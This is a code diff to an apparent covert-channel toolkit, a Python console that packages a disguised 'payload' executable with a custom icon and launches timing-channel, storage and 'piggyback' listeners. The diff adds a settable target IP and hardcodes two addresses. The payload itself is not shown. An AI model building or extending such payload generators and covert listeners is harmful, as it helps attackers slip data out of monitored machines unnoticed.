@@ -11,8 +11,8 @@ import subprocess
 
 filepath = "Hi.txt"
 port = 12001
-ip_addr = socket.gethostbyname(socket.gethostname())
-
+ip_addr = "138.47.130.215"
+tar_ip = "138.47.138.176"
 
 #########Front End of the Porgram (Console)
 def console():
@@ -22,10 +22,12 @@ def console():
 
     global filepath
     global port
+    global tar_ip
 
     ##gets the ip address of the host
     global ip_addr
 
+    print("type help for a list of commands")
     while(True):
         commands = input(">>").split()
 
@@ -39,16 +41,22 @@ def console():
     reset                            - resets the given parameters
     delete [FP or ip or port]        - deletes one of the parameters in FN OR FP
     setIp                            - sets the IP
+    settarIp                         - set target Ip
     setPort                          - sets the port
     name                             - sets the name of the payload
     icon [File.ico]                  - generate the icon for the paylaod (Needs to be in same directory as DGCC exe)
     run                              - give user the payload
                 """)
 
+        ##exist the program
+        if(commands[0] == "settarIp"):
+            tar_ip = commands[1]
+            print("settarIp = " + str(tar_ip))
+            print("")
 
         ##exist the program
         if(commands[0] == "exit"):
-            break
+            quit()
 
         ##gives the user to be able to add the file path
         if(commands[0] == "filepath"):
@@ -62,6 +70,7 @@ def console():
             print("name = " + str(name))
             print("filepath = " + str(filepath))
             print("IP = " + str(ip_addr))
+            print("Tar_IP = " + str(tar_ip))
             print("Port = " + str(port))
             print("Icon = " + str(icon))
             print("")
@@ -142,8 +151,8 @@ def makeexe(name, icon):
     #os.rmdir('/__pycache__')
 
 
-def liseners(ip, port):
-    subprocess.Popen('python ListenerSocketTiming.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
+def liseners(ip, port, tar_ip):
+    subprocess.Popen('python ListenerSocketTiming.py ' + str(tar_ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
     subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # active storage
     subprocess.Popen('PassiveServer.exe variables.txt ',creationflags=subprocess.CREATE_NEW_CONSOLE) # piggyback 
 
@@ -161,4 +170,4 @@ if __name__ == '__main__':
             f.write(str(port) + "\n")
             f.write(ip_addr +"\n")
 
-    liseners(Ip, port)
+    liseners(Ip, port, tar_ip)
